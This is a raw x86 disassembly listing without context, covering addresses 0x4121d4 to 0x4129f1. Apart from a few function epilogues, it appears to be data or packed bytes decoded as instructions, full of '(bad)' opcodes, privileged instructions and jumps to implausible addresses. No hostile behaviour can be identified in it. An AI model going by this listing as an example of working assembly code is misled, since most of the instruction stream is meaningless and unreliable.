  4121d4:	in     al,0x82
  4121d6:	jmp    0x4121d5
  4121d8:	sub    eax,0xd48dba5c
  4121dd:	dec    ecx
  4121de:	imul   esp,DWORD PTR [edx-0x10],0xbe96615d
  4121e5:	test   DWORD PTR [eax-0x7719d987],0xfed442fd
  4121ef:	or     esp,ebx
  4121f1:	add    eax,0xe226ee3c
  4121f6:	ds inc ebp
  4121f8:	mov    esi,esi
  4121fa:	ins    DWORD PTR es:[edi],dx
  4121fb:	jg     0x4121c9
  4121fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121fe:	dec    ebx
  4121ff:	imul   eax
  412201:	imul   esp,DWORD PTR [edx+0x64],0xe4691a64
  412208:	cmc    
  412209:	and    DWORD PTR [edx+0x4854cad3],esi
  41220f:	mov    al,0xe5
  412211:	mov    al,ds:0x2a6cf8a
  412216:	test   eax,0x37e41000
  41221b:	mov    dl,0x48
  41221d:	sti    
  41221e:	stos   BYTE PTR es:[edi],al
  41221f:	cs jae 0x412295
  412222:	inc    edi
  412223:	ret    0x4d70
  412226:	out    0xc2,eax
  412228:	mov    eax,0x8bbc855d
  41222d:	xor    BYTE PTR [ebx+0x33],cl
  412230:	rol    BYTE PTR [ecx],cl
  412232:	pop    ebp
  412233:	hlt    
  412234:	pop    ebx
  412235:	mov    eax,DWORD PTR [ebp-0xc]
  412238:	pop    edi
  412239:	pop    esi
  41223a:	pop    ebx
  41223b:	leave  
  41223c:	ret    0x10
  41223f:	dec    ebp
  412240:	push   ebp
  412241:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  412247:	mov    esp,ebp
  412249:	or     ah,dh
  41224b:	dec    ebp
  41224c:	add    bh,al
  41224e:	add    BYTE PTR [eax],cl
  412250:	add    BYTE PTR [eax],al
  412252:	mov    DWORD PTR [eax],0x40f44545
  412258:	xor    DWORD PTR [eax],eax
  41225a:	test   DWORD PTR [ebx-0x34070b64],ecx
  412260:	(bad)  
  412261:	enter  0x4d45,0xbc
  412265:	mov    esi,DWORD PTR [eax]
  412267:	hlt    
  412268:	test   ebx,ecx
  41226a:	pushf  
  41226b:	enter  0x4df8,0x8b
  41226f:	mov    DWORD PTR [ebp-0x20],0x890208
  412276:	inc    ebp
  412277:	inc    ebp
  412278:	cld    
  412279:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41227f:	or     BYTE PTR [ebx+0x0],dl
  412282:	mov    ebx,0x8bd5500
  412287:	call   DWORD PTR [ecx-0x1]
  41228a:	pop    es
  41228b:	mov    ch,0x33
  41228d:	dec    ebx
  41228f:	(bad)  
  412290:	mov    eax,0x72009ca4
  412295:	push   DWORD PTR [edx]
  412297:	or     BYTE PTR [eax],al
  412299:	jmp    0xff89:0x75c84d03
  4122a0:	dec    ebp
  4122a1:	loopne 0x412273
  4122a3:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  4122a9:	add    BYTE PTR [ebx],dh
  4122ab:	mov    ecx,ebx
  4122ad:	hlt    
  4122ae:	add    ecx,ebx
  4122b0:	enter  0x899c,0x32
  4122b4:	dec    ebp
  4122b5:	add    ecx,eax
  4122b7:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  4122bd:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4122c4:	xor    ecx,ebx
  4122c6:	retf   
  4122c7:	enter  0x4d03,0xc8
  4122cb:	mov    DWORD PTR fs:[eax],ebx
  4122ce:	lea    eax,[eax]
  4122d0:	push   esp
  4122d1:	mov    edi,edi
  4122d3:	fs (bad) 
  4122d5:	(bad)  
  4122d6:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4122dc:	push   0xffffffff
  4122de:	and    bh,bh
  4122e0:	pop    ecx
  4122e1:	inc    eax
  4122e2:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4122e8:	push   0xffffff8b
  4122ea:	pop    ecx
  4122eb:	cld    
  4122ec:	dec    ebp
  4122ed:	lea    ecx,[ecx+0x45ff08ff]
  4122f3:	mov    BYTE PTR [edx+0x1],cl
  4122f6:	add    BYTE PTR [eax],al
  4122f8:	mov    DWORD PTR [ebp+0x8],0x58008d
  4122ff:	dec    DWORD PTR [ebp-0x77]
  412302:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  412309:	cld    
  41230a:	dec    ebp
  41230b:	jne    0x412340
  41230d:	lea    eax,[ebx]
  41230f:	push   eax
  412310:	mov    edi,edi
  412312:	or     BYTE PTR [ecx+0x54a845],cl
  412318:	add    al,ch
  41231a:	(bad)  
  41231b:	sub    esp,ebp
  41231d:	add    BYTE PTR [eax],al
  41231f:	rol    BYTE PTR [eax],0x84
  412322:	inc    ebp
  412323:	add    dh,BYTE PTR [esi+0x0]
  412326:	add    BYTE PTR [ebp-0x73],al
  412329:	mov    ebp,DWORD PTR [esp+edx*4]
  41232c:	inc    DWORD PTR [eax]
  41232e:	lea    ecx,[ebx-0x30074f4]
  412334:	call   0x422eb9
  412339:	add    BYTE PTR [ebp+0x0],cl
  41233c:	jne    0x41237f
  41233e:	dec    DWORD PTR [ebx-0x76210314]
  412344:	dec    ebp
  412345:	add    DWORD PTR [ebp+0x0],esi
  412348:	(bad)  
  412349:	xchg   ebp,eax
  41234a:	loopne 0x41234b
  41234c:	inc    eax
  41234d:	inc    DWORD PTR [eax]
  41234f:	mov    ecx,DWORD PTR [ebp-0x4]
  412352:	xor    edx,DWORD PTR [edx+0x7201b8]
  412358:	add    BYTE PTR [edx],dl
  41235a:	enter  0x4d90,0x0
  41235e:	mov    eax,DWORD PTR [eax]
  412360:	hlt    
  412361:	add    al,0xa5
  412363:	mov    al,0xff
  412365:	add    bh,bh
  412367:	add    BYTE PTR [ebx],dh
  412369:	inc    DWORD PTR [ebx]
  41236b:	sbb    al,0x89
  41236d:	jne    0x412347
  41236f:	mov    esp,DWORD PTR [ecx+0x4500fc]
  412375:	mov    eax,DWORD PTR [ebp-0xff0048]
  41237b:	mov    DWORD PTR [eax-0x70],0xee58ed89
  412382:	inc    DWORD PTR [ebp-0x75]
  412385:	fisttp QWORD PTR [eax+eiz*8]
  412388:	test   DWORD PTR [esi-0x1],esp
  41238b:	inc    ebp
  41238c:	(bad)  
  41238d:	aas    
  41238e:	inc    ebp
  41238f:	(bad)  
  412390:	lea    edi,[esp+eiz*2-0x1]
  412394:	inc    edi
  412396:	mov    DWORD PTR ds:0x8000c7a0,edi
  41239c:	mov    ebp,esi
  41239e:	cld    
  41239f:	in     al,0x8d
  4123a1:	inc    ebp
  4123a2:	jmp    eax
  4123a4:	(bad)  
  4123a5:	fisttp WORD PTR [eax+0x8801c7]
  4123ab:	jecxz  0x4123f2
  4123ad:	out    dx,al
  4123ae:	inc    DWORD PTR [ebp-0x4]
  4123b1:	out    0x8d,eax
  4123b3:	aas    
  4123b4:	inc    edi
  4123b6:	jmp    FWORD PTR [eax-0x78]
  4123b9:	inc    DWORD PTR [ecx]
  4123bb:	mov    DWORD PTR [eax],0xc7a83d
  4123c1:	ins    BYTE PTR es:[edi],dx
  4123c2:	test   edi,edi
  4123c4:	pandn  mm0,mm5
  4123c7:	aas    
  4123c8:	add    bh,al
  4123ca:	mov    esi,DWORD PTR [eax-0x4]
  4123cd:	inc    DWORD PTR [eax+0xdf01e0]
  4123d3:	(bad)  
  4123d4:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4123d8:	mov    ebp,ebx
  4123da:	xchg   esp,eax
  4123db:	fild   DWORD PTR [eax]
  4123dd:	(bad)  
  4123de:	mov    edi,DWORD PTR [eax+0x3]
  4123e1:	(bad)  
  4123e2:	cmp    al,0xe7
  4123e4:	dec    ebp
  4123e5:	leave  
  4123e6:	mov    ebp,eax
  4123e8:	fsubr  DWORD PTR [ecx]
  4123ea:	add    BYTE PTR [eax],al
  4123ec:	lea    ecx,[ebx-0x7f0003b4]
  4123f2:	push   edx
  4123f3:	add    DWORD PTR [ebp+0x0],edx
  4123f6:	mov    esi,DWORD PTR [eax]
  4123f8:	mov    WORD PTR [ebx-0x7a750000],?
  4123fe:	add    esi,DWORD PTR [ebp-0x78]
  412401:	mov    eax,DWORD PTR [eax]
  412403:	cld    
  412404:	push   0x7d
  412406:	dec    DWORD PTR [ebx+0xd88c]
  41240c:	push   edx
  41240d:	mov    edx,DWORD PTR [ecx-0x4]
  412410:	call   DWORD PTR [eax+0x7d01fc]
  412416:	mov    ebx,edx
  412418:	cld    
  412419:	add    BYTE PTR [eax+0x560150],dl
  41241f:	test   DWORD PTR [ebp+0x75],eax
  412422:	in     al,0x8b
  412424:	in     al,dx
  412425:	cld    
  412426:	(bad)  
  412427:	jge    0x4123bd
  412429:	mov    esp,ebx
  41242b:	fsub   st,st(7)
  41242d:	add    bh,al
  41242f:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  412435:	add    edi,edi
  412437:	add    bh,bh
  412439:	mov    eax,0x50d800ed
  41243e:	inc    ebp
  41243f:	push   esi
  412440:	fisttp WORD PTR [ebx+0x4dc7f43f]
  412446:	test   BYTE PTR [ebx],dh
  412448:	fadd   DWORD PTR ds:0x4572c2
  41244e:	jmp    0x412411
  412450:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  412457:	inc    esi
  412458:	jo     0x41245a
  41245a:	test   edi,eax
  41245c:	jmp    esp
  41245e:	inc    DWORD PTR [eax]
  412460:	in     eax,dx
  412461:	add    al,bl
  412463:	jne    0x4123ea
  412465:	mov    edi,edi
  412467:	cld    
  412468:	inc    DWORD PTR [ebp-0x12]
  41246b:	mov    esp,esp
  41246d:	mov    ah,0x85
  41246f:	add    bh,bh
  412471:	call   0x1194d75
  412476:	ret    0x858b
  412479:	cld    
  41247a:	inc    DWORD PTR [eax+0xe301ff]
  412480:	out    dx,al
  412481:	xor    BYTE PTR [ebp-0xff00cf],al
  412487:	mov    ebx,ebp
  412489:	cld    
  41248a:	jo     0x412415
  41248c:	or     DWORD PTR [ecx],eax
  41248e:	add    BYTE PTR [eax],al
  412490:	push   eax
  412491:	add    DWORD PTR [ebp+0x45],eax
  412494:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  41249a:	dec    DWORD PTR [ebx-0x3fda0318]
  4124a0:	add    BYTE PTR [ebp-0xbf0040],dl
  4124a6:	inc    ebp
  4124a7:	or     BYTE PTR [ebx-0x4faf0400],0x45
  4124ae:	add    DWORD PTR [ebx+0x459c00],ecx
  4124b4:	mov    edi,edi
  4124b6:	mov    eax,0xe80800ff
  4124bb:	inc    ebp
  4124bc:	sub    BYTE PTR [ebx-0x47000400],cl
  4124c2:	add    al,0x1
  4124c4:	rol    BYTE PTR [eax],0x1e
  4124c7:	jne    0x41250e
  4124c9:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4124cf:	inc    DWORD PTR [ecx]
  4124d1:	call   0x864cd6
  4124d6:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4124dc:	call   0x414ce2
  4124e1:	xor    bh,bh
  4124e3:	push   edi
  4124e4:	adc    BYTE PTR [ebx-0x747423bb],al
  4124ea:	loopne 0x4124c8
  4124ec:	ret    
  4124ed:	loopne 0x41248b
  4124ef:	xor    DWORD PTR [edx],0x31
  4124f2:	cmp    edi,edi
  4124f4:	bswap  esp
  4124f6:	rol    BYTE PTR gs:[eax],0x5
  4124fa:	jmp    0x12c2644
  4124ff:	mov    eax,DWORD PTR [ebp-0x4]
  412502:	add    BYTE PTR [eax+0xff0100],bh
  412508:	cld    
  412509:	jne    0x412588
  41250b:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  412511:	push   ss
  412512:	add    DWORD PTR [eax],eax
  412514:	add    BYTE PTR [eax+0x7f],dl
  412517:	inc    ebp
  412518:	add    BYTE PTR [ebx+0x459850],cl
  41251e:	mov    edi,edi
  412520:	test   al,0xff
  412522:	add    BYTE PTR [eax],cl
  412524:	inc    DWORD PTR [ebp-0x18]
  412527:	jmp    DWORD PTR ds:0x4d7d00dc
  41252d:	adc    BYTE PTR [ebx+0x459cb9],cl
  412533:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  412539:	pushf  
  41253a:	mov    eax,0x30132
  41253f:	lea    esi,[ebp+0x2c]
  412542:	xor    edi,edi
  412544:	(bad)  
  412545:	call   0x1404cb2
  41254a:	call   0x1354dda
  41254f:	jne    0x4124dc
  412551:	xor    edi,esp
  412553:	add    eax,DWORD PTR [eax+0xc018d]
  412559:	push   DWORD PTR [eax]
  41255b:	call   0xca4cb7
  412560:	int3   
  412561:	inc    DWORD PTR [ebp-0x14]
  412564:	mov    ecx,DWORD PTR [ebp-0x28]
  412567:	xor    eax,DWORD PTR [eax]
  412569:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  41256f:	(bad)  
  412570:	xchg   ebp,eax
  412571:	in     al,0xff
  412573:	add    bh,bh
  412575:	add    BYTE PTR [ebp+0x45],dl
  412578:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  41257e:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  412585:	mov    edi,edi
  412587:	or     BYTE PTR [eax],cl
  412589:	inc    ebp
  41258a:	test   DWORD PTR gs:[eax],eax
  41258d:	je     0x4125d4
  41258f:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  412595:	xor    edx,DWORD PTR [eax-0x73]
  412598:	push   ebp
  412599:	or     BYTE PTR [ebp+0x21007572],al
  41259f:	inc    ebp
  4125a0:	in     al,dx
  4125a1:	mov    ebp,DWORD PTR [eax]
  4125a3:	mov    esp,0x648bc345
  4125a8:	fmul   st,st(5)
  4125aa:	add    BYTE PTR [ebx],ch
  4125ac:	mov    eax,DWORD PTR [ebx]
  4125ae:	cld    
  4125af:	loopne 0x412571
  4125b1:	inc    ebp
  4125b2:	push   ebp
  4125b3:	cmp    ebp,eax
  4125b5:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  4125bc:	cld    
  4125bd:	fadd   DWORD PTR [eax+0x3b014d]
  4125c3:	jne    0x4125f5
  4125c5:	push   0xf8898557
  4125ca:	in     al,dx
  4125cb:	jne    0x412612
  4125cd:	lea    eax,[ebx+0x72e8dcc8]
  4125d3:	das    
  4125d4:	mov    eax,DWORD PTR [eax]
  4125d6:	mov    esp,0x33eb7545
  4125db:	mov    edi,DWORD PTR [edi+0x4572bc]
  4125e1:	xor    eax,edi
  4125e3:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  4125ed:	rcl    BYTE PTR [eax-0x40],1
  4125f0:	inc    ebp
  4125f1:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4125f9:	inc    ebp
  4125fa:	xchg   ebp,eax
  4125fb:	ud0    ebp,DWORD PTR [ebx]
  4125fe:	inc    DWORD PTR [eax]
  412600:	retf   
  412601:	jbe    0x412603
  412603:	mov    dl,BYTE PTR [eax-0x80]
  412606:	push   ebp
  412607:	pop    ds
  412608:	mov    ecx,DWORD PTR [esp+esi*8]
  41260b:	inc    eax
  41260c:	retf   
  41260d:	inc    ebp
  41260e:	iret   
  41260f:	jb     0x4125d9
  412611:	mov    eax,DWORD PTR [edi]
  412613:	enter  0x4545,0x1
  412617:	xor    DWORD PTR [eax],eax
  412619:	pushf  
  41261a:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  412620:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  412627:	dec    ebp
  412628:	add    BYTE PTR [ebx],dh
  41262a:	inc    ebp
  41262b:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  412631:	xor    dl,BYTE PTR [edx]
  412633:	add    eax,DWORD PTR [ebp-0x77]
  412636:	mov    eax,esp
  412638:	fmul   DWORD PTR [ebp-0x3d]
  41263b:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  412642:	mov    DWORD PTR [ebp-0x28],eax
  412645:	rol    DWORD PTR [ebp-0x64],1
  412648:	xor    eax,edi
  41264a:	mov    ecx,0xff858db0
  41264f:	clc    
  412650:	enter  0x4d45,0x32
  412654:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  41265b:	test   esi,edi
  41265d:	clc    
  41265e:	inc    DWORD PTR [ebp+0x45]
  412661:	cmp    al,0x8b
  412663:	pushf  
  412664:	or     bh,al
  412666:	enter  0x16a8,0x85
  41266a:	xor    eax,edi
  41266c:	pushf  
  41266d:	inc    ebp
  41266e:	(bad)  
  41266f:	ds cld 
  412671:	pushf  
  412672:	inc    ebp
  412673:	mov    edx,DWORD PTR [eax-0x28]
  412676:	lock push ebp
  412678:	add    BYTE PTR [ebx],dh
  41267a:	mov    DWORD PTR [ebx],eax
  41267c:	sar    BYTE PTR [ebx],1
  41267e:	adc    BYTE PTR [edi],cl
  412680:	dec    ebp
  412681:	adc    al,0x8b
  412683:	add    al,dl
  412685:	jmp    0x1022855
  41268a:	jb     0x4126d9
  41268c:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  412692:	xor    ecx,DWORD PTR [ebp+0x3b]
  412695:	xor    ecx,DWORD PTR [edi]
  412697:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  41269b:	(bad)  
  41269d:	clc    
  41269e:	enter  0x8400,0x8b
  4126a2:	pop    es
  4126a3:	mov    al,0x0
  4126a5:	push   ebp
  4126a6:	push   cs
  4126a7:	xor    ecx,eax
  4126a9:	xor    esp,ecx
  4126ab:	add    ebp,DWORD PTR [eax]
  4126ad:	add    esi,DWORD PTR [eax]
  4126af:	(bad)  
  4126b1:	retf   0x55c8
  4126b4:	repnz mov eax,DWORD PTR [ebp-0x10]
  4126b8:	(bad)  
  4126b9:	cli    
  4126ba:	fdivr  st,st(1)
  4126bc:	test   DWORD PTR [eax+edi*8],ecx
  4126bf:	dec    ebp
  4126c0:	inc    ebp
  4126c1:	xor    edi,DWORD PTR [eax-0x7167afd]
  4126c7:	add    BYTE PTR [ebp+0x0],al
  4126ca:	mov    ecx,DWORD PTR [ebp-0x28]
  4126cd:	mov    ecx,ebx
  4126cf:	clc    
  4126d0:	jne    0x41269d
  4126d2:	mov    esi,0xd672d3
  4126d7:	into   
  4126d8:	into   
  4126d9:	scas   eax,DWORD PTR es:[edi]
  4126da:	dec    ebp
  4126db:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4126e1:	sub    ecx,esi
  4126e3:	cmp    ecx,DWORD PTR [ebp+0x77]
  4126e6:	(bad)  
  4126e7:	mov    edi,eax
  4126e9:	mov    al,0x85
  4126eb:	mov    eax,edi
  4126ed:	add    BYTE PTR [ebp-0x75],al
  4126f0:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4126f7:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4126fd:	(bad)  
  4126ff:	retf   0x559c
  412702:	(bad)  
  412703:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  41270a:	inc    ebp
  41270b:	add    eax,0xeb9c4d3f
  412710:	(bad)  
  412711:	mov    ecx,esp
  412713:	lods   al,BYTE PTR ds:[esi]
  412714:	test   DWORD PTR [ebp-0x8],edx
  412717:	xor    ecx,DWORD PTR [ebp+0x33]
  41271a:	mov    eax,DWORD PTR [ebx]
  41271c:	lock add ecx,ebx
  41271f:	bswap  esi
  412721:	retf   0x55d1
  412724:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  41272a:	jmp    0x412725
  41272c:	add    BYTE PTR ds:0xebc44d8b,al
  412732:	push   ebp
  412733:	mov    ebp,DWORD PTR [ebx]
  412735:	test   al,0x8b
  412737:	push   ebp
  412738:	clc    
  412739:	xor    ecx,ebx
  41273b:	xor    ecx,esi
  41273d:	add    edx,ecx
  41273f:	add    eax,DWORD PTR [edx+0xca010f]
  412745:	push   ebp
  412746:	dec    ebp
  412747:	mov    ecx,DWORD PTR [ebx-0x34050710]
  41274d:	stc    
  41274e:	rol    DWORD PTR ds:0xebce4dd6,cl
  412754:	scas   eax,DWORD PTR es:[edi]
  412755:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  41275b:	xor    ebp,DWORD PTR [ebx]
  41275d:	xor    edi,DWORD PTR [ebx]
  41275f:	add    esi,DWORD PTR [edi+0x3]
  412762:	mov    ecx,DWORD PTR [edi]
  412764:	clc    
  412765:	retf   0x55cb
  412768:	into   
  412769:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  412770:	mov    eax,0x3376554d
  412775:	mov    esi,DWORD PTR [ebx]
  412777:	int3   
  412778:	add    edx,DWORD PTR [ebp+0x3]
  41277b:	xor    ecx,DWORD PTR [edi]
  41277d:	xor    ecx,edx
  41277f:	add    edx,DWORD PTR [ebp+0x3]
  412782:	mov    ecx,DWORD PTR [edi]
  412784:	lock retf 0x4dfa
  412788:	stc    
  412789:	mov    ecx,DWORD PTR [eax]
  41278b:	or     BYTE PTR [ebp+0x4d],cl
  41278e:	jmp    0x105281e
  412793:	dec    ebp
  412794:	dec    ebp
  412795:	(bad)  
  412796:	mov    ebx,esp
  412798:	clc    
  412799:	test   ebx,ecx
  41279b:	clc    
  41279c:	ror    DWORD PTR [ebp-0x2a],cl
  41279f:	mov    esi,ecx
  4127a1:	call   0x33cc6d55
  4127a6:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  4127ad:	retf   
  4127ae:	ja     0x41277e
  4127b0:	mov    ebp,DWORD PTR [eax-0x48]
  4127b3:	dec    ebp
  4127b4:	xor    ecx,DWORD PTR [di+0x3]
  4127b8:	mov    esp,esp
  4127ba:	clc    
  4127bb:	push   ebp
  4127bc:	retf   
  4127bd:	mov    dl,bl
  4127bf:	adc    esi,edx
  4127c1:	jb     0x412791
  4127c3:	add    BYTE PTR [edi-0x3b7474b3],ch
  4127c9:	call   0x4d6cf34b
  4127ce:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4127d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d5:	pushf  
  4127d6:	inc    ebp
  4127d7:	xor    cl,BYTE PTR [ebp-0x78]
  4127da:	mov    edx,edi
  4127dc:	clc    
  4127dd:	dec    ebp
  4127de:	retf   
  4127df:	mov    edx,ebx
  4127e1:	call   0x560ffbbc
  4127e6:	scas   eax,DWORD PTR es:[edi]
  4127e7:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4127ed:	pushf  
  4127ee:	sub    esi,DWORD PTR [edx]
  4127f0:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4127f6:	lods   al,BYTE PTR ds:[esi]
  4127f7:	xor    esp,DWORD PTR [ebx]
  4127f9:	add    ecx,DWORD PTR [ebp-0x1c]
  4127fc:	mov    edi,DWORD PTR [ebp-0x8]
  4127ff:	mov    bl,cl
  412801:	cmp    dl,bl
  412803:	jb     0x4127d3
  412805:	add    dh,dl
  412807:	dec    ebp
  412808:	scas   eax,DWORD PTR es:[edi]
  412809:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  41280f:	shr    DWORD PTR [ebx],cl
  412811:	into   
  412812:	cmp    edx,esi
  412814:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  41281a:	dec    ebp
  41281b:	dec    ebp
  41281c:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  412822:	retf   
  412823:	xor    edx,esi
  412825:	add    ecx,esi
  412827:	imul   ecx,edx
  41282a:	mov    DWORD PTR [ebp+0x8],edx
  41282d:	xor    ecx,DWORD PTR [ebp+0x2b]
  412830:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  412836:	add    esi,DWORD PTR [ebx]
  412838:	mov    ah,0x3
  41283a:	inc    ebp
  41283b:	rdtsc  
  41283d:	xlat   BYTE PTR ds:[ebx]
  41283e:	pushf  
  41283f:	jge    0x4127ca
  412841:	xor    ebx,eax
  412843:	sub    eax,DWORD PTR [ebp-0x73]
  412846:	(bad)  
  412847:	cmp    al,al
  412849:	jb     0x4127d0
  41284b:	add    al,bh
  41284d:	ror    DWORD PTR [ebp-0x7a],1
  412850:	xor    edi,edi
  412852:	add    edi,edi
  412854:	jmp    0x4128a3
  412856:	mov    ecx,DWORD PTR [ebx-0x34341324]
  41285c:	dec    ebp
  41285d:	into   
  41285e:	mov    ebp,DWORD PTR [edi-0x23737428]
  412864:	pushf  
  412865:	shl    DWORD PTR [edx],cl
  412867:	retf   0x5588
  41286a:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412870:	add    eax,DWORD PTR [eax]
  412872:	in     al,0x4d
  412874:	push   ebp
  412875:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  41287b:	fs add ch,cl
  41287e:	dec    ebp
  41287f:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  412885:	dec    ebp
  412886:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  41288c:	jge    0x41285c
  41288e:	mov    BYTE PTR [edi+0xf723b3a],ch
  412894:	add    cl,dh
  412896:	dec    ebp
  412897:	dec    DWORD PTR [ebx-0x2c032375]
  41289d:	adc    BYTE PTR [ebp+0x1],0x8b
  4128a1:	add    al,bl
  4128a3:	jge    0x412831
  4128a5:	push   0xffffff9c
  4128a7:	push   0x8b3032
  4128ac:	shl    BYTE PTR [ebp+0x55],0x6a
  4128b0:	xor    edi,edi
  4128b2:	xor    edx,DWORD PTR [ebx+eax*1]
  4128b5:	inc    ebp
  4128b6:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4128bc:	dec    ebp
  4128bd:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4128c3:	jbe    0x412850
  4128c5:	mov    ebp,esp
  4128c7:	ror    bl,1
  4128c9:	enter  0x14ce,0xaf
  4128cd:	dec    DWORD PTR [ebx-0x2cef17f8]
  4128d3:	push   ebp
  4128d4:	retf   0x5540
  4128d7:	push   ebp
  4128d8:	mov    esi,DWORD PTR [edx-0x1c]
  4128db:	mov    edx,ebx
  4128dd:	cld    
  4128de:	(bad)  
  4128df:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4128e6:	sti    
  4128e7:	add    dh,cl
  4128e9:	push   0xffffff94
  4128eb:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  4128f2:	bswap  esp
  4128f4:	pop    esi
  4128f5:	inc    ebp
  4128f6:	dec    DWORD PTR [ecx+0x45e8c88b]
  4128fc:	push   ebp
  4128fd:	xor    esi,DWORD PTR [ebx]
  4128ff:	mov    DWORD PTR [ebx],0xcac00f9c
  412905:	aas    
  412906:	push   ebp
  412907:	inc    ebp
  412908:	xor    ecx,eax
  41290a:	add    ecx,eax
  41290c:	mov    eax,DWORD PTR [ebx]
  41290e:	(bad)  
  41290f:	jmp    0x41289d
  412911:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  412918:	les    edi,FWORD PTR [esi-0xeccefb3]
  41291e:	mov    edx,0xff378d80
  412923:	mov    dh,0xd1
  412925:	cmp    edx,DWORD PTR [ebp+0xf]
  412928:	mov    eax,DWORD PTR [edx-0x20]
  41292b:	add    BYTE PTR [ebp-0x75],bh
  41292e:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  412935:	pushf  
  412936:	retf   0x8632
  412939:	cmp    ebp,0x8
  41293c:	call   ebx
  41293e:	inc    ebp
  41293f:	inc    ebp
  412940:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  412946:	mov    esi,DWORD PTR [ecx]
  412948:	enter  0x49c,0xc7
  41294c:	add    al,al
  41294e:	add    bl,al
  412950:	(bad)  
  412951:	clc    
  412952:	enter  0x45,0x31
  412956:	push   eax
  412957:	pushf  
  412958:	mov    edi,eax
  41295a:	int3   
  41295b:	or     al,al
  41295d:	test   DWORD PTR [edi],edi
  41295f:	clc    
  412960:	gs inc ebp
  412962:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  412968:	push   ss
  412969:	xor    ecx,DWORD PTR [ebp+0x3]
  41296c:	sub    edx,DWORD PTR [ecx-0x76]
  41296f:	dec    ebp
  412970:	add    DWORD PTR [ebx+0x88d845],ecx
  412976:	mov    esi,DWORD PTR [ebx]
  412978:	or     BYTE PTR [ebx],al
  41297a:	cmp    edx,DWORD PTR [ecx-0x38]
  41297d:	dec    ebp
  41297e:	out    dx,eax
  41297f:	xor    eax,DWORD PTR [ebp+0x3]
  412982:	mov    edx,DWORD PTR [ecx-0x28]
  412985:	dec    ebp
  412986:	add    BYTE PTR [ebx],dh
  412988:	push   0x518003
  41298d:	push   eax
  41298e:	add    BYTE PTR [ebx-0x300748b],cl
  412994:	sbb    BYTE PTR [ebp+0x45],cl
  412997:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  41299d:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4129a3:	dec    ebp
  4129a4:	inc    ebp
  4129a5:	xor    ecx,eax
  4129a7:	add    ecx,eax
  4129a9:	push   ecx
  4129aa:	(bad)  
  4129ab:	dec    ebp
  4129ac:	mov    al,ds:0xc5e03dff
  4129b1:	retf   
  4129b2:	(bad)  
  4129b3:	into   
  4129b4:	sub    bh,bh
  4129b6:	dec    esp
  4129b7:	adc    al,0x9c
  4129b9:	inc    ebp
  4129ba:	push   ebp
  4129bb:	test   DWORD PTR [edi],ecx
  4129bd:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  4129c4:	jmp    0xc9ba38d8
  4129c9:	add    cl,dl
  4129cb:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4129d5:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4129db:	rol    BYTE PTR [eax],0x55
  4129de:	clc    
  4129df:	fs jb  0x4129e9
  4129e2:	mov    eax,DWORD PTR [ebp-0x30]
  4129e5:	xor    al,0x40
  4129e7:	sub    al,0xc7
  4129e9:	mov    ah,ch
  4129eb:	add    DWORD PTR [ebp+0x4534f845],eax
  4129f1:	sub    al,0x86
